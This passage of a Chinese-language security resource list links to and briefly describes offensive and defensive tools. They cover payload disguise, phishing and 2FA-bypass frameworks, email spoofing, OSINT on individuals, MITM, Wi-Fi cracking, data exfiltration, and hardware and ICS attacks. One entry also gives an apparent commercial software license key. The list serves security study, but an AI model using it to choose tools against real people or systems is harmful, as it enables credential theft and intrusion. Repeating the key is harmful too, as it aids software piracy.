exe 可执行文件</p></li><li><p><a href="https://github.com/islamadel/bat2exe">https://github.com/islamadel/bat2exe</a> 将 bat 文件转换为 exe 二进制文件</p></li><li><p><a href="https://github.com/tywali/Bat2ExeConverter">https://github.com/tywali/Bat2ExeConverter</a> 将 bat 文件转换为 exe 二进制文件</p></li><li><p><a href="https://github.com/Juntalis/win32-bat2exe">https://github.com/Juntalis/win32-bat2exe</a> 将 bat 文件转换为 exe 二进制文件</p></li><li><p><a href="http://www.f2ko.de/downloads/Bat_To_Exe_Converter.zip">http://www.f2ko.de/downloads/Bat_To_Exe_Converter.zip</a> 将 bat 文件转换为 exe 二进制文件，可以隐藏窗口。</p></li><li><p><a href="https://github.com/r00t-3xp10it/trojanizer">https://github.com/r00t-3xp10it/trojanizer</a> 将两个可执行文件打包为自解压文件，自解压文件在执行时会执行可执行文件</p></li><li><p><a href="https://github.com/r00t-3xp10it/backdoorppt">https://github.com/r00t-3xp10it/backdoorppt</a> 将 payload 更换图标</p></li><li><p><a href="https://github.com/r00t-3xp10it/FakeImageExploiter">https://github.com/r00t-3xp10it/FakeImageExploiter</a> 将 payload 更换图标。需要 wine 与 resourcehacker 环境</p></li><li><p><a href="https://github.com/DamonMohammadbagher/FakeFileMaker">https://github.com/DamonMohammadbagher/FakeFileMaker</a> 更换图标和名称</p></li><li><p><a href="https://github.com/peewpw/Invoke-PSImage">https://github.com/peewpw/Invoke-PSImage</a> 将 PS 脚本隐藏进 PNG 像素中并用一行指令去执行它</p></li><li><p><a href="https://github.com/Mr-Un1k0d3r/DKMC">https://github.com/Mr-Un1k0d3r/DKMC</a> Don’t kill my cat 生成混淆的 shellcode，将 shellcode 存储在多语言图像中</p></li><li><p><a href="https://github.com/deepzec/Bad-Pdf">https://github.com/deepzec/Bad-Pdf</a> 生成一个 pdf 文件，内含 payload 来窃取 win 上的 Net-NTLM 哈希</p></li><li><p><a href="https://github.com/3gstudent/Worse-PDF">https://github.com/3gstudent/Worse-PDF</a> 向 PDF 文件中插入恶意代码，来窃取 win 上的 Net-NTLM 哈希</p></li></ul><h2 id="社工相关"><a href="#社工相关" class="headerlink" title="社工相关#"></a><strong>社工相关</strong>#</h2><ul><li><p><a href="https://github.com/brannondorsey/PassGAN">https://github.com/brannondorsey/PassGAN</a> py,深度学习,密码字典样本生成</p></li><li><p><a href="https://github.com/Mebus/cupp">https://github.com/Mebus/cupp</a> 根据用户习惯密码生成弱口令探测</p></li><li><p><a href="https://github.com/Saferman/cupper">https://github.com/Saferman/cupper</a> 根据用户习惯密码生成弱口令探测，楼上升级</p></li><li><p><a href="https://github.com/LandGrey/pydictor">https://github.com/LandGrey/pydictor</a> py3，特定密码字典生成</p></li><li><p><a href="https://github.com/mehulj94/Radium-Keylogger">https://github.com/mehulj94/Radium-Keylogger</a> python 下的键盘记录工具</p></li><li><p><a href="https://github.com/threatexpress/domainhunter">https://github.com/threatexpress/domainhunter</a> 检查过期域名，bluecoat 分类和 Archive.org 历史记录，以确定最为适合于钓鱼和 C2 的域名</p></li><li><p><a href="https://github.com/Mr-Un1k0d3r/CatMyPhish">https://github.com/Mr-Un1k0d3r/CatMyPhish</a> 收集目标类似的尚未注册的域名</p></li><li><p><a href="https://github.com/x0day/Multisearch-v2">https://github.com/x0day/Multisearch-v2</a> Bing、google、360、zoomeye 等搜索引擎聚合搜索，可用于发现企业被搜索引擎收录的敏感资产信息</p></li><li><p><a href="https://github.com/n0tr00t/Sreg">https://github.com/n0tr00t/Sreg</a> Sreg 可对使用者通过输入 email、phone、username 的返回用户注册的所有互联网护照信息。</p></li><li><p><a href="https://github.com/SpiderLabs/social_mapper">https://github.com/SpiderLabs/social_mapper</a> 社交媒体枚举和关联工具, 通过人脸识别关联人物侧写</p></li><li><p><a href="https://github.com/vysec/MaiInt">https://github.com/vysec/MaiInt</a> 公司雇员信息收集测试工具</p></li><li><p><a href="https://github.com/jofpin/trape">https://github.com/jofpin/trape</a> py，利用 OSINT 对人员进行追踪定位</p></li><li><p><a href="https://github.com/famavott/osint-scraper">https://github.com/famavott/osint-scraper</a> 输入人名或邮箱地址, 自动从互联网爬取关于此人的信息</p></li><li><p><a href="https://github.com/xHak9x/fbi">https://github.com/xHak9x/fbi</a> py2,facebook 脸书信息搜集工具</p></li><li><p><a href="https://github.com/initstring/linkedin2username">https://github.com/initstring/linkedin2username</a> 通过 Linkedin 领英获取相关公司员工列表</p></li><li><p><a href="https://github.com/0x09AL/raven">https://github.com/0x09AL/raven</a> linux 下领英 Linkedin information gathering tool</p></li><li><p><a href="https://github.com/Ridter/Mailget">https://github.com/Ridter/Mailget</a> 通过脉脉用户猜测企业邮箱</p></li><li><p><a href="https://github.com/haccer/tweep">https://github.com/haccer/tweep</a> 使用 twitter API 进行信息爬取查询</p></li><li><p><a href="https://github.com/MazenElzanaty/TwLocation">https://github.com/MazenElzanaty/TwLocation</a> py，获取 Twitter 用户发推的地址</p></li><li><p><a href="https://github.com/vaguileradiaz/tinfoleak">https://github.com/vaguileradiaz/tinfoleak</a> web 界面，对某人的 twitter 进行全面的情报分析</p></li><li><p><a href="https://github.com/deepfakes">https://github.com/deepfakes</a> 虚假音视频制作</p></li><li><p><a href="https://www.jianshu.com/p/147cf5414851">https://www.jianshu.com/p/147cf5414851</a> 聊聊那些常见的探侦类 APP</p></li><li><p><a href="https://github.com/thinkst/canarytokens">https://github.com/thinkst/canarytokens</a> 重要文件的追踪溯源，信标定位（<a href="https://canarytokens.org/generate#%EF%BC%89">https://canarytokens.org/generate#）</a></p></li><li><p><a href="https://github.com/ggerganov/kbd-audio">https://github.com/ggerganov/kbd-audio</a> c++,linux,利用麦克风监控键盘输入测试输入值</p></li></ul><h2 id="网站克隆镜像伪造"><a href="#网站克隆镜像伪造" class="headerlink" title="网站克隆镜像伪造#"></a><strong>网站克隆镜像伪造</strong>#</h2><ul><li><a href="http://www.httrack.com/">http://www.httrack.com</a> 网站克隆镜像</li></ul><h2 id="钓鱼框架邮件伪造"><a href="#钓鱼框架邮件伪造" class="headerlink" title="钓鱼框架邮件伪造#"></a><strong>钓鱼框架邮件伪造</strong>#</h2><ul><li><p><a href="https://github.com/bhdresh/SocialEngineeringPayloads">https://github.com/bhdresh/SocialEngineeringPayloads</a> 负责收集用于证书盗窃和鱼叉式网络钓鱼攻击的社交工程技巧和 payloads</p></li><li><p><a href="https://github.com/trustedsec/social-engineer-toolkit">https://github.com/trustedsec/social-engineer-toolkit</a> 专为社交工程设计的开源渗透测试框架</p></li><li><p><a href="https://github.com/thelinuxchoice/blackeye">https://github.com/thelinuxchoice/blackeye</a> 拥有 facebook、instagram 等三十余个钓鱼模板的一键启用工具</p></li><li><p><a href="https://github.com/M4cs/BlackEye-Python">https://github.com/M4cs/BlackEye-Python</a> 以 blackeye 为基础加强子域的管理</p></li><li><p><a href="https://github.com/azizaltuntas/Camelishing">https://github.com/azizaltuntas/Camelishing</a> py3，界面化社会工程学攻击辅助工具</p></li><li><p><a href="https://github.com/JonCooperWorks/judas">https://github.com/JonCooperWorks/judas</a> go，克隆网站钓鱼</p></li><li><p><a href="https://github.com/gophish/gophish">https://github.com/gophish/gophish</a> go，拥有在线模板设计、发送诱骗广告等功能的钓鱼系统</p></li><li><p><a href="https://github.com/tatanus/SPF">https://github.com/tatanus/SPF</a> py2，deefcon 上的钓鱼系统</p></li><li><p><a href="https://github.com/MSG-maniac/mail_fishing">https://github.com/MSG-maniac/mail_fishing</a> 甲方内部钓鱼系统</p></li><li><p><a href="https://github.com/samyoyo/weeman">https://github.com/samyoyo/weeman</a> 钓鱼的 http 服务器</p></li><li><p><a href="https://github.com/Raikia/FiercePhish">https://github.com/Raikia/FiercePhish</a> 可以管理所有钓鱼攻击的完整钓鱼框架，允许你跟踪单独的网络钓鱼活动，定时发送电子邮件等</p></li><li><p><a href="https://github.com/securestate/king-phisher">https://github.com/securestate/king-phisher</a> 可视化钓鱼活动工具包</p></li><li><p><a href="https://github.com/fireeye/ReelPhish">https://github.com/fireeye/ReelPhish</a> 实时双因素网络钓鱼工具</p></li><li><p><a href="https://github.com/kgretzky/evilginx">https://github.com/kgretzky/evilginx</a> 绕过双因素验证的钓鱼框架</p></li><li><p><a href="https://github.com/kgretzky/evilginx2">https://github.com/kgretzky/evilginx2</a> MiTM 框架, 登录页面钓鱼, 绕过双因素认证等</p></li><li><p><a href="https://github.com/ustayready/CredSniper">https://github.com/ustayready/CredSniper</a> 使用 Flask 和 Jinja2 模板编写的网络钓鱼框架，支持捕获 2FA 令牌</p></li><li><p><a href="https://github.com/fireeye/PwnAuth">https://github.com/fireeye/PwnAuth</a> OAuth 滥用测试检测平台</p></li><li><p><a href="https://github.com/n0pe-sled/Postfix-Server-Setup">https://github.com/n0pe-sled/Postfix-Server-Setup</a> 自动化建立一个网络钓鱼服务器</p></li><li><p><a href="https://github.com/Dionach/PhEmail">https://github.com/Dionach/PhEmail</a> py2，钓鱼与邮件伪造</p></li><li><p><a href="https://github.com/PHPMailer/PHPMailer">https://github.com/PHPMailer/PHPMailer</a> 世界上最流行的 PHP 发送邮件的代码</p></li><li><p><a href="http://tool.chacuo.net/mailanonymous">http://tool.chacuo.net/mailanonymous</a> 在线邮件伪造</p></li><li><p><a href="http://ns4gov.000webhostapp.com/">http://ns4gov.000webhostapp.com</a> 在线邮件伪造</p></li></ul><h2 id="中间人攻击流量劫持"><a href="#中间人攻击流量劫持" class="headerlink" title="中间人攻击流量劫持#"></a><strong>中间人攻击流量劫持</strong>#</h2><ul><li><p><a href="https://github.com/bettercap/bettercap">https://github.com/bettercap/bettercap</a> 网络攻击以及监控的瑞士军刀。该工具支持多种模块，比如 ARP/DNS 欺骗、TCP 以及数据包代理等</p></li><li><p><a href="https://github.com/mitmproxy/mitmproxy">https://github.com/mitmproxy/mitmproxy</a> PY,支持 SSL 拦截，进行 https 流量代理</p></li><li><p><a href="https://github.com/qiyeboy/BaseProxy">https://github.com/qiyeboy/BaseProxy</a> py3,异步 http/https 代理,楼上简化版。可以作为中间人工具，比如说替换网址图片等</p></li><li><p><a href="https://github.com/lgandx/Responder">https://github.com/lgandx/Responder</a> 用于嗅探网络内所有的 NTLM、NTLMv1/v2、Net-NTLMv1/v2 包，对网络内主机进行欺骗获取用户 hash。a 拿着 b 密码请求 b，c 对 a 说我是 b，然后 c 获得了 b 的密码，<a href="https://www.secpulse.com/archives/65503.html">https://www.secpulse.com/archives/65503.html</a> 【脉搏译文系列】渗透师指南之 Responder。</p></li><li><p><a href="https://github.com/Kevin-Robertson/Inveigh">https://github.com/Kevin-Robertson/Inveigh</a> 一款 PowerShell LLMNR / mDNS / NBNS 欺骗器和中间人工具</p></li><li><p><a href="https://github.com/LionSec/xerosploit">https://github.com/LionSec/xerosploit</a> 中间人攻击测试工具包</p></li><li><p><a href="https://github.com/AlsidOfficial/WSUSpendu">https://github.com/AlsidOfficial/WSUSpendu</a> 可以自主创建恶意更新，并将其注入到 WSUS 服务器数据库中，然后随意的分发这些恶意更新</p></li><li><p><a href="https://github.com/infobyte/evilgrade">https://github.com/infobyte/evilgrade</a> 一个模块化的脚本框架，使攻击者在不知情的情况下将恶意更新注入到用户更新中</p></li><li><p><a href="https://github.com/quickbreach/smbetray">https://github.com/quickbreach/smbetray</a> 专注于通过文件内容交换、lnk 交换来攻击客户端，以及窃取任何以明文形式传输的数据</p></li><li><p><a href="https://github.com/mrexodia/haxxmap">https://github.com/mrexodia/haxxmap</a> 对 IMAP 服务器进行中间人攻击</p></li></ul><h2 id="协议解析流量还原分析"><a href="#协议解析流量还原分析" class="headerlink" title="协议解析流量还原分析#"></a><strong>协议解析流量还原分析</strong>#</h2><ul><li><p><a href="https://github.com/wireshark/wireshark">https://github.com/wireshark/wireshark</a> 协议解析流量分析还原</p></li><li><p><a href="https://github.com/CoreSecurity/impacket">https://github.com/CoreSecurity/impacket</a> Impacket 是用于处理网络协议的 Python 工具包集合，内网中可用以提权例如 wmiexec.py、NMB，SMB1-3 和 MS-DCERPC 提供对协议实现本身的低级别编程访问。</p></li><li><p><a href="https://github.com/secdev/scapy">https://github.com/secdev/scapy</a> 内置了交互式网络数据包处理、数据包生成器、网络扫描器网络发现和包嗅探工具，提供多种协议包生成及解析插件，能够灵活的的生成协议数据包，并进行修改、解析。</p></li><li><p><a href="https://gitee.com/qielige/openQPA">https://gitee.com/qielige/openQPA</a> 协议分析软件 QPA 的开源代码，特点是进程抓包、特征自动分析</p></li><li><p><a href="https://github.com/jtpereyda/boofuzz">https://github.com/jtpereyda/boofuzz</a> 网络协议 fuzz 测试</p></li><li><p><a href="https://www.jianshu.com/p/4dca12a35158">https://www.jianshu.com/p/4dca12a35158</a> 5 个常用的免费报文库</p></li><li><p><a href="https://github.com/zerbea/hcxdumptool">https://github.com/zerbea/hcxdumptool</a> 从 Wlan 设备上捕获数据包</p></li><li><p><a href="https://github.com/NytroRST/NetRipper">https://github.com/NytroRST/NetRipper</a> 支持截获像 putty,winscp,mssql,chrome,firefox,outlook，https 中的明文密码</p></li><li><p><a href="https://github.com/shramos/polymorph">https://github.com/shramos/polymorph</a> 支持几乎所有现有协议的实时网络数据包操作框架</p></li><li><p><a href="https://github.com/nospaceships/raw-socket-sniffer">https://github.com/nospaceships/raw-socket-sniffer</a> C,PS，无需驱动抓取 Windows 流量</p></li></ul><h2 id="无线网络-WIFI-中间人攻击"><a href="#无线网络-WIFI-中间人攻击" class="headerlink" title="无线网络 WIFI 中间人攻击#"></a><strong>无线网络 WIFI 中间人攻击</strong>#</h2><ul><li><p><a href="https://github.com/wi-fi-analyzer/fluxion">https://github.com/wi-fi-analyzer/fluxion</a> 窃取用户 wifi 密码的进行密码重放攻击</p></li><li><p><a href="https://github.com/0v3rl0w/e013">https://github.com/0v3rl0w/e013</a> 窃取 Wifi 密码. VB 脚本</p></li><li><p><a href="https://github.com/cls1991/ng">https://github.com/cls1991/ng</a> 获取你当前连接 wifi 的密码与 ip</p></li><li><p><a href="https://github.com/wifiphisher/wifiphisher">https://github.com/wifiphisher/wifiphisher</a> PY,中间人攻击，FakeAp 恶意热点，WIFI 钓鱼，凭证窃取</p></li><li><p><a href="https://github.com/1N3/PRISM-AP">https://github.com/1N3/PRISM-AP</a> 自动部署 RogueAP(恶意热点) MITM 攻击框架</p></li><li><p><a href="https://github.com/sensepost/mana">https://github.com/sensepost/mana</a> Wifi 劫持工具，可以监听计算机或其他移动设备的 Wifi 通信，并能够模仿该设备</p></li><li><p><a href="https://github.com/deltaxflux/fluxion">https://github.com/deltaxflux/fluxion</a> bash 与 py，对使用 wpa 协议的无线网络进行 MiTM 攻击</p></li><li><p><a href="https://github.com/DanMcInerney/LANs.py">https://github.com/DanMcInerney/LANs.py</a> ARP 欺骗，无线网络劫持</p></li></ul><h2 id="无线网络-WIFI-防御"><a href="#无线网络-WIFI-防御" class="headerlink" title="无线网络 WIFI 防御#"></a><strong>无线网络 WIFI 防御</strong>#</h2><ul><li><p><a href="https://github.com/SYWorks/waidps">https://github.com/SYWorks/waidps</a> PY,Linux 下无线网络入侵检测工具</p></li><li><p><a href="https://github.com/SkypLabs/probequest">https://github.com/SkypLabs/probequest</a> 嗅探和显示无线网卡附近的 Wifi Probe 请求</p></li><li><p><a href="https://github.com/wangshub/hmpa-pi">https://github.com/wangshub/hmpa-pi</a> 在树莓派或路由，利用 Wireshark 扫描附近网络 WiFi 设备，当有手机或其它 Wi-Fi 设备在附近时，通过邮件或者微信提醒</p></li><li><p><a href="https://github.com/besimaltnok/PiFinger">https://github.com/besimaltnok/PiFinger</a> 检查 wifi 是否为”Wifi-Pineapple 大菠萝”所开放的恶意热点</p></li><li><p><a href="https://github.com/WiPi-Hunter/PiSavar">https://github.com/WiPi-Hunter/PiSavar</a> 利用 PineAP，对于 FAKE AP 虚假接入点，如”Wifi-Pineapple 大菠萝”进行监测</p></li></ul><h2 id="无线网络-WIFI-审计测试"><a href="#无线网络-WIFI-审计测试" class="headerlink" title="无线网络 WIFI 审计测试#"></a><strong>无线网络 WIFI 审计测试</strong>#</h2><ul><li><p><a href="https://www.wifislax.com/">https://www.wifislax.com</a> 西班牙 wifi 审计系统，国内汉化版为无线革新 5.1.1 Wifislax-WRC</p></li><li><p><a href="https://cn.elcomsoft.com/ewsa.html">https://cn.elcomsoft.com/ewsa.html</a> ewsa，wifi 嗅探，握手包密码还原，EWSA-173-HC1UW-L3EGT-FFJ3O-SOQB3</p></li><li><p><a href="https://www.passcape.com/">https://www.passcape.com</a> wifipr，握手包密码还原，另外还有许多商业版 windows 下密码还原工具</p></li><li><p><a href="https://github.com/MisterBianco/BoopSuite">https://github.com/MisterBianco/BoopSuite</a> 无线网络审计工具，支持 2-5GHZ 频段</p></li><li><p><a href="https://github.com/aircrack-ng/aircrack-ng">https://github.com/aircrack-ng/aircrack-ng</a> 由数据包嗅探器、检测器、WPA / WPA2-PSK 解密器、WEP 和用于 802.11 无线局域网的分析工具组成</p></li><li><p><a href="https://github.com/t6x/reaver-wps-fork-t6x">https://github.com/t6x/reaver-wps-fork-t6x</a> wps 跑 pin 码攻击，常见 wifi 攻击</p></li><li><p><a href="https://github.com/derv82/wifite2">https://github.com/derv82/wifite2</a> wifite 无线审计工具升级版，联动 aircrack-ng 与 reaver</p></li><li><p><a href="https://github.com/savio-code/fern-wifi-cracker">https://github.com/savio-code/fern-wifi-cracker</a> 无线安全审计工具</p></li><li><p><a href="https://github.com/P0cL4bs/WiFi-Pumpkin">https://github.com/P0cL4bs/WiFi-Pumpkin</a> 无线安全渗透测试套件</p></li><li><p><a href="https://github.com/entropy1337/infernal-twin">https://github.com/entropy1337/infernal-twin</a> 自动化无线攻击工具 Infernal-Wireless</p></li><li><p><a href="https://github.com/m4n3dw0lf/PytheM">https://github.com/m4n3dw0lf/PytheM</a> Python 网络/渗透测试工具</p></li><li><p><a href="https://github.com/InfamousSYN/rogue">https://github.com/InfamousSYN/rogue</a> 无线网络攻击工具包</p></li><li><p><a href="https://github.com/cSploit/android">https://github.com/cSploit/android</a> 手机 WiFi 渗透工具框架，可以使用 msf</p></li><li><p><a href="https://github.com/chrisk44/Hijacker">https://github.com/chrisk44/Hijacker</a> 手机 wifi 测试工具</p></li><li><p><a href="https://andrax-pentest.org/">https://andrax-pentest.org/</a> kali hunter 手机渗透测试系统</p></li><li><p><a href="https://www.zimperium.com/zanti-mobile-penetration-testing">https://www.zimperium.com/zanti-mobile-penetration-testing</a> 手机 wifi 渗透工具</p></li></ul><h2 id="数据取回隐秘传输"><a href="#数据取回隐秘传输" class="headerlink" title="数据取回隐秘传输#"></a><strong>数据取回隐秘传输</strong>#</h2><ul><li><p><a href="https://github.com/TryCatchHCF/Cloakify">https://github.com/TryCatchHCF/Cloakify</a> 躲避 DLP/MLS 数据泄露防护系统，突破数据白名单控制，躲避 AV 检测进行数据盗取</p></li><li><p><a href="https://github.com/sensepost/DET">https://github.com/sensepost/DET</a> 使用单个或多个通道同时执行数据取回</p></li><li><p><a href="https://github.com/Arno0x/DNSExfiltrator">https://github.com/Arno0x/DNSExfiltrator</a> 利用 DNS 解析进行数据隐秘传输的工具</p></li><li><p><a href="https://github.com/ytisf/PyExfil">https://github.com/ytisf/PyExfil</a> 用于数据取回的 Python 软件包</p></li><li><p><a href="https://github.com/Arno0x/ReflectiveDnsExfiltrator">https://github.com/Arno0x/ReflectiveDnsExfiltrator</a> 反射 DNS 解析隐蔽通道进行数据泄露</p></li></ul><h2 id="硬件安全"><a href="#硬件安全" class="headerlink" title="硬件安全#"></a><strong>硬件安全</strong>#</h2><ul><li><p><a href="https://github.com/unprovable/PentestHardware">https://github.com/unprovable/PentestHardware</a> 硬件渗透测试实用手册</p></li><li><p><a href="https://ducktoolkit.com/">https://ducktoolkit.com/</a> 橡皮鸭、HID 键盘模拟器</p></li><li><p><a href="https://github.com/insecurityofthings/jackit">https://github.com/insecurityofthings/jackit</a> 用于 Mousejack 的开发代码</p></li><li><p><a href="https://github.com/samyk/magspoof">https://github.com/samyk/magspoof</a> 信用卡信息盗取</p></li><li><p><a href="https://github.com/mame82/P4wnP1_aloa">https://github.com/mame82/P4wnP1_aloa</a> 在树莓派 Raspberry Pi 上安装常用的测试组件，打造移动测试平台</p></li><li><p><a href="https://www.freebuf.com/geek/195631.html">https://www.freebuf.com/geek/195631.html</a> 成为物理黑客吧！利用树莓派实现 P4wnP1 项目进行渗透测试</p></li><li><p><a href="https://github.com/mame82/P4wnP1">https://github.com/mame82/P4wnP1</a> 在树莓派安装网络劫持键盘注入(WHID)工具</p></li><li><p><a href="https://github.com/ebursztein/malusb">https://github.com/ebursztein/malusb</a> 创建跨平台的 HID 欺骗 payload，并在 Windows 和 OSX 上建立反向 TCP-shell</p></li><li><p><a href="https://github.com/Orange-Cyberdefense/fenrir-ocd">https://github.com/Orange-Cyberdefense/fenrir-ocd</a> 主要功能和用途是绕过有线 802.1x 保护并使你能够访问目标网络</p></li><li><p><a href="https://github.com/360PegasusTeam/GhostTunnel">https://github.com/360PegasusTeam/GhostTunnel</a> 可在隔离环境下使用 HID 生成隐蔽后门，释放有效负载后删除自身</p></li><li><p><a href="https://github.com/LennyLeng/RadioEye">https://github.com/LennyLeng/RadioEye</a> RFID 配合常见的 NFC 使用</p></li><li><p><a href="https://github.com/Proxmark/proxmark3/">https://github.com/Proxmark/proxmark3/</a> RFID 神器 PM3</p></li><li><p><a href="http://www.freebuf.com/news/others/605.html">http://www.freebuf.com/news/others/605.html</a> RFID Hacking–资源大合集</p></li><li><p><a href="https://github.com/UnicornTeam/HackCube-Special">https://github.com/UnicornTeam/HackCube-Special</a> 独角兽实验室硬件渗透测试平台</p></li></ul><h2 id="IoT-安全"><a href="#IoT-安全" class="headerlink" title="IoT 安全#"></a><strong>IoT 安全</strong>#</h2><ul><li><p><a href="https://github.com/w3h/icsmaster">https://github.com/w3h/icsmaster</a> 整合工控安全资源</p></li><li><p><a href="https://github.com/V33RU/IoTSecurity101">https://github.com/V33RU/IoTSecurity101</a> IoT 工控安全与物联网安全学习的一些文章和资源</p></li><li><p><a href="http://www.freebuf.com/ics-articles">http://www.freebuf.com/ics-articles</a> 工控相关</p></li><li><p><a href="http://www.freebuf.com/sectool/174567.html">http://www.freebuf.com/sectool/174567.html</a> 工业控制系统（ICS）安全专家必备的测试工具和安全资源</p></li><li><p><a href="http://www.freebuf.com/articles/ics-articles/178822.html">http://www.freebuf.com/articles/ics-articles/178822.html</a> 浅析煤炭企业如何进行工控安全建设</p></li><li><p><a href="http://www.freebuf.com/articles/network/178251.html">http://www.freebuf.com/articles/network/178251.html</a> 工控安全现场实施经验谈之工控系统如何加强主机防护</p></li><li><p><a href="https://github.com/hslatman/awesome-industrial-control-system-security">https://github.com/hslatman/awesome-industrial-control-system-security</a> 工控系统安全方向优秀资源收集仓库</p></li><li><p><a href="https://github.com/adi0x90/attifyos">https://github.com/adi0x90/attifyos</a> IoT 集成安全测试系统，带有一些常用的软件</p></li><li><p><a href="https://github.com/moki-ics/moki">https://github.com/moki-ics/moki</a> 一键配置类似 kali 的工控渗透测试系统的脚本，</p></li><li><p><a href="https://gitlab.com/expliot_framework/expliot">https://gitlab.com/expliot_framework/expliot</a> py3，工控安全漏洞测试框架</p></li><li><p><a href="https://github.com/dark-lbp/isf">https://github.com/dark-lbp/isf</a> py2,工控中类似 msf 的测试框架</p></li><li><p><a href="https://github.com/enddo/smod">https://github.com/enddo/smod</a> py2，使用了 scapy 模块，主要针对 modbus 协议测试</p></li><li><p><a href="https://github.com/shodan-labs/iotdb">https://github.com/shodan-labs/iotdb</a> nmap 配合 shodan API 扫描 IoT 设备</p></li><li><p><a href="https://github.com/XHermitOne/icscanner">https://github.com/XHermitOne/icscanner</a> 带界面的 ics 扫描器</p></li><li><p><a href="https://github.com/yanlinlin82/plcscan">https://github.com/yanlinlin82/plcscan</a> 通过 TCP/102 和 TCP/502 识别互联网上 PLC 设备和其他 Modbus 设备</p></li><li><p><a href="https://github.com/nsacyber/GRASSMARLIN">https://github.com/nsacyber/GRASSMARLIN</a> NSA 旗下 ICS/SCADA 态势感知</p></li><li><p><a href="https://github.com/nezza/scada-stuff">https://github.com/nezza/scada-stuff</a> 对 SCADA/ICS 设备进行逆向与攻击</p></li></ul><h2 id="摄像头安全"><a href="#摄像头安全" class="headerlink" title="摄像头安全#"></a><strong>摄像头安全</strong>#</h2><ul><li><p><a href="https://github.com/woj-ciech/kamerka">https://github.com/woj-ciech/kamerka</a> 配合 shodan API 扫描到的摄像头地理位置显示在地图上</p></li><li><p><a href="https://github.com/Ullaakut/cameradar">https://github.com/Ullaakut/cameradar</a> GO,针对摄像头 RTSP 协议渗透测试，附弱口令字典</p></li><li><p><a href="https://github.com/Ullaakut/camerattack">https://github.com/Ullaakut/camerattack</a> GO,摄像头远程禁用</p></li><li><p><a href="https://github.com/NIteshx2/UltimateSecurityCam">https://github.com/NIteshx2/UltimateSecurityCam</a> py3，摄像头监测外来人员软件，有防欺骗设置</p></li></ul><h2 id="路由安全"><a href="#路由安全" class="headerlink" title="路由安全#"></a><strong>路由安全</strong>#</h2><ul><li><p><a href="http://stascorp.com/">http://stascorp.com</a> RouterScan 毛子开发的路由器漏洞利用工具，界面化很强大</p></li><li><p><a href="https://github.com/threat9/routersploit">https://github.com/threat9/routersploit</a> py3，仿 msf 路由器漏洞利用框架</p></li><li><p><a href="https://github.com/jh00nbr/Routerhunter-2.0">https://github.com/jh00nbr/Routerhunter-2.0</a> 已停止更新，路由器漏洞扫描利用</p></li><li><p><a href="https://github.com/googleinurl/RouterHunterBR">https://github.com/googleinurl/RouterHunterBR</a> php，路由器设备漏洞扫描利用</p></li><li><p><a href="https://github.com/scu-igroup/telnet-scanner">https://github.com/scu-igroup/telnet-scanner</a> Telnet 服务密码撞库</p></li></ul><h2 id="物联网安全"><a href="#物联网安全" class="headerlink" title="物联网安全#"></a><strong>物联网安全</strong>#</h2><ul><li><p><a href="https://github.com/RUB-NDS/PRET">https://github.com/RUB-NDS/PRET</a> 打印机攻击框架</p></li><li><p><a href="https://github.com/rapid7/IoTSeeker">https://github.com/rapid7/IoTSeeker</a> 物联网设备默认密码扫描检测工具</p></li><li><p><a href="https://github.com/schutzwerk/CANalyzat0r">https://github.com/schutzwerk/CANalyzat0r</a> 专有汽车协议的安全分析工具包</p></li><li><p><a href="https://github.com/pasta-auto">https://github.com/pasta-auto</a> 智能汽车测试</p></li></ul><h2 id="Fuzz-模糊测试漏洞挖掘"><a href="#Fuzz-模糊测试漏洞挖掘" class="headerlink" title="Fuzz 模糊测试漏洞挖掘#"></a><strong>Fuzz 模糊测试漏洞挖掘</strong>#</h2><ul><li><p><a href="http://www.freebuf.com/articles/rookie/169413.html">http://www.freebuf.com/articles/rookie/169413.html</a> 一系列用于 Fuzzing 学习的资源汇总</p></li><li><p><a href="https://github.com/secfigo/Awesome-Fuzzing">https://github.com/secfigo/Awesome-Fuzzing</a> Fuzz 相关学习资料</p></li><li><p><a href="https://github.com/fuzzdb-project/fuzzdb">https://github.com/fuzzdb-project/fuzzdb</a> fuzz 资料数据库</p></li><li><p><a href="https://github.com/ivanfratric/winafl">https://github.com/ivanfratric/winafl</a> AFL for fuzzing Windows binaries,原创技术分析 | AFL 漏洞挖掘技术漫谈</p></li><li><p><a href="https://github.com/attekett/NodeFuzz">https://github.com/attekett/NodeFuzz</a> a fuzzer harness for web browsers and browser like applications.</p></li><li><p><a href="https://github.com/google/oss-fuzz">https://github.com/google/oss-fuzz</a> Continuous Fuzzing for Open Source Software</p></li><li><p><a href="http://blog.topsec.com.cn/ad_lab/alphafuzzer/">http://blog.topsec.com.cn/ad_lab/alphafuzzer/</a> 以文件格式为主的漏洞挖掘工具</p></li><li><p><a href="https://bbs.ichunqiu.com/thread-24898-1-1.html">https://bbs.ichunqiu.com/thread-24898-1-1.html</a> Test404 -HTTP Fuzzer V3.0</p></li><li><p><a href="https://github.com/xmendez/wfuzz">https://github.com/xmendez/wfuzz</a> py，Web 安全模糊测试工具，模块化可处理 burp 所抓请求和响应报文</p></li><li><p><a href="https://github.com/1N3/BlackWidow">https://github.com/1N3/BlackWidow</a> 基于 Python 实现的 Web 爬虫，用于收集目标网站的情报信息并对 OWASP 漏洞进行模糊测试</p></li><li><p><a href="https://github.com/bunzen/pySSDeep">https://github.com/bunzen/pySSDeep</a> py，一个基于模糊哈希（Fuzzy Hashing）算法的工具。go，glaslos/ssdeep；C，ssdeep-project/ssdeep</p></li><li></li></ul><p>o<a href="https://github.com/googleprojectzero/winafl">https://github.com/googleprojectzero/winafl</a> AFL 针对 Windows 二进制进行测试</p><h2 id="安全防护"><a href="#安全防护" class="headerlink" title="安全防护#"></a><strong>安全防护</strong>#</h2><ul><li><p><a href="https://github.com/baidu/AdvBox">https://github.com/baidu/AdvBox</a> Advbox 是支持多种深度学习平台的 AI 模型安全工具箱，既支持白盒和黑盒算法生成对抗样本，衡量 AI 模型鲁棒性，也支持常见的防御算法</p></li><li><p><a href="https://github.com/quoscient/octopus">https://github.com/quoscient/octopus</a> 区块链智能合约安全分析工具</p></li><li><p><a href="https://github.com/Cyb3rWard0g/HELK">https://github.com/Cyb3rWard0g/HELK</a> 具有高级分析功能的威胁狩猎 ELK</p></li><li><p><a href="https://github.com/trimstray/otseca">https://github.com/trimstray/otseca</a> linux 系统审计工具，可以导出系统配置，生成报表</p></li><li><p><a href="https://github.com/BugScanTeam/DNSLog">https://github.com/BugScanTeam/DNSLog</a> 一款基于 django 监控 DNS 解析记录和 HTTP 访问记录的工具，可以配合盲注、xss、解析对方真实 ip 使用</p></li><li><p><a href="https://github.com/mwrlabs/dref">https://github.com/mwrlabs/dref</a> DNS 重绑定利用框架</p></li><li><p><a 